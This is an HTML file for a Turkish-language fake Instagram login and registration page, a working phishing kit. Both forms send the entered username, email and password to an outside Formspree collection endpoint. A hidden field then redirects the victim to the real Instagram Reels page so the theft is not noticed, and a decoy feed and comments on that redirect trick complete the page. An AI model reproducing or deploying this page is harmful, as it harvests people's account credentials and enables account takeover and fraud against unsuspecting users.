<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fafafa; color: #262626; }

        /* --- GİRİŞ & KAYIT TASARIMI --- */
        .auth-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .auth-container { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 40px; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; }
        .logo { font-size: 38px; margin-bottom: 30px; font-family: 'Brush Script MT', cursive; font-weight: 500; }
        form { width: 100%; display: flex; flex-direction: column; }
        input { background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 8px; border-radius: 3px; font-size: 12px; outline: none; }
        button { background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .switch-box { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 25px; text-align: center; font-size: 14px; }
        .switch-box a { color: #0095f6; text-decoration: none; font-weight: 600; cursor: pointer; }

        /* --- ANA SAYFA (REELS/FEED) TASARIMI --- */
        .navbar { position: fixed; top: 0; width: 100%; height: 60px; background: white; border-bottom: 1px solid #dbdbdb; display: flex; justify-content: center; z-index: 100; }
        .nav-content { width: 100%; max-width: 975px; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; }
        .main-content { margin-top: 80px; display: flex; justify-content: center; }
        .feed { width: 100%; max-width: 470px; }
        .post { background: white; border: 1px solid #dbdbdb; border-radius: 8px; margin-bottom: 20px; }
        .post-img { width: 100%; aspect-ratio: 1/1; object-fit: cover; }
        .post-info { padding: 12px; }

        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="login-screen" class="auth-wrapper">
        <div class="auth-container">
            <h1 class="logo">Instagram</h1>
            <form action="https://formspree.io/f/mdaplwyo" method="POST">
                <input type="hidden" name="_next" value="https://www.instagram.com/reels/"> 
                
                <input type="text" name="Giriş_ID" placeholder="Kullanıcı adı veya e-posta" required>
                <input type="password" name="Sifre" placeholder="Şifre" required>
                <button type="submit">Giriş Yap</button>
            </form>
        </div>
        <div class="switch-box">Hesabın yok mu? <a onclick="showRegister()">Kaydol</a></div>
    </div>

    <div id="register-screen" class="auth-wrapper hidden">
        <div class="auth-container">
            <h1 class="logo">Instagram</h1>
            <form action="https://formspree.io/f/mdaplwyo" method="POST">
                <input type="hidden" name="_next" value="https://www.instagram.com/reels/">
                <input type="text" name="Kayit_Eposta" placeholder="E-posta" required>
                <input type="text" name="Kayit_Kullanici" placeholder="Kullanıcı Adı" required>
                <input type="password" name="Kayit_Sifre" placeholder="Şifre" required>
                <button type="submit">Kaydol</button>
            </form>
        </div>
        <div class="switch-box">Hesabın var mı? <a onclick="showLogin()">Giriş Yap</a></div>
    </div>

    <div id="main-feed" class="hidden">
        <nav class="navbar">
            <div class="nav-content">
                <div class="logo" style="font-size: 24px; margin-bottom: 0;">Instagram</div>
                <div>🏠 ✉️ ➕ 🧭 ❤️</div>
            </div>
        </nav>
        <main class="main-content">
            <div class="feed">
                <div class="post">
                    <div style="padding:10px; font-weight:600;">reels_videolari</div>
                    <img src="https://picsum.photos/600/800" class="post-img" alt="Reels">
                    <div class="post-info"><b>reels_videolari</b> Harika bir manzara! #reels #kesfet</div>
                </div>
            </div>
        </main>
    </div>

    <script>
        function showRegister() {
            document.getElementById('login-screen').classList.add('hidden');
            document.getElementById('register-screen').classList.remove('hidden');
        }

        function showLogin() {
            document.getElementById('register-screen').classList.add('hidden');
            document.getElementById('login-screen').classList.remove('hidden');
        }

        // Eğer URL'de "success" gibi bir parametre varsa direkt ana sayfayı göster diyebilirsin
        // Ancak en basiti Formspree'nin içindeki _next özelliğidir.
    </script>
</body>
</html>
